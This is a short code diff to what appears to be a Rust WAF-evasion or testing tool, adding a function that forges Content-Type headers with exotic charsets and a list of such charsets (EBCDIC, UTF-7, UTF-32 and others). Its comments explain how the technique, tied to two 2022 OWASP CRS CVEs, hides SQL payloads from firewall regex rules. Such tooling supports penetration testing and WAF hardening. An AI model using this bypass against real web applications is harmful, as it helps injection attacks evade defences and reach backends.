@@ -262,6 +262,42 @@ pub fn comma_join(header_name: &str, real_value: &str, benign_value: &str) -> St
     format!("{header_name}: {benign}, {real}")
 }
 
+/// Build a `Content-Type` header with an exotic charset claim.
+///
+/// CVE-2022-39956 (Content-Type/Content-Transfer-Encoding abuse) +
+/// CVE-2022-39957 (Accept-Charset bypass) — OWASP CRS pre-3.3.3 did
+/// not validate the charset field before running UTF-8 regex rules.
+/// Attacker claims `charset=ibm037` (EBCDIC) or `charset=utf-32`;
+/// WAF runs regex against bytes that aren't even ASCII-`SELECT`, so
+/// the rule misses. Backend re-decodes via its own charset
+/// negotiation and sees the original payload.
+///
+/// Still relevant for unpatched CRS deployments AND for WAFs
+/// (Cloudflare, AWS) that don't fully validate charset before
+/// scanning. Fixed in CRS 3.3.3 / 3.2.2 (Sept 2022).
+#[must_use]
+pub fn charset_confusion(media_type: &str, charset: &str) -> String {
+    // No sanitize_header_value here — the whole point is exotic
+    // charset claims; the WAF SHOULD accept the line per RFC.
+    format!("Content-Type: {media_type}; charset={charset}")
+}
+
+/// Canonical list of exotic charset claims for `charset_confusion`.
+/// Each is a real IANA charset that some backend will accept and a
+/// hand-rolled WAF regex won't decode.
+pub const EXOTIC_CHARSETS: &[&str] = &[
+    "ibm037",     // EBCDIC — byte values disjoint from ASCII
+    "ibm500",     // EBCDIC variant
+    "utf-32",     // 4-byte-per-char — ASCII regex misses
+    "utf-32be",
+    "utf-16",
+    "utf-16be",
+    "utf-7",      // SELECT = +U0wAAA-
+    "shift_jis",  // Japanese — partial ASCII overlap
+    "gb18030",    // Chinese
+    "iso-2022-jp", // Stateful — toggle-byte before SELECT
+];
+
 /// Apply all header obfuscation techniques to a header name/value pair.
 ///
 /// Returns a vector of `(technique, obfuscated_header_line)` pairs.
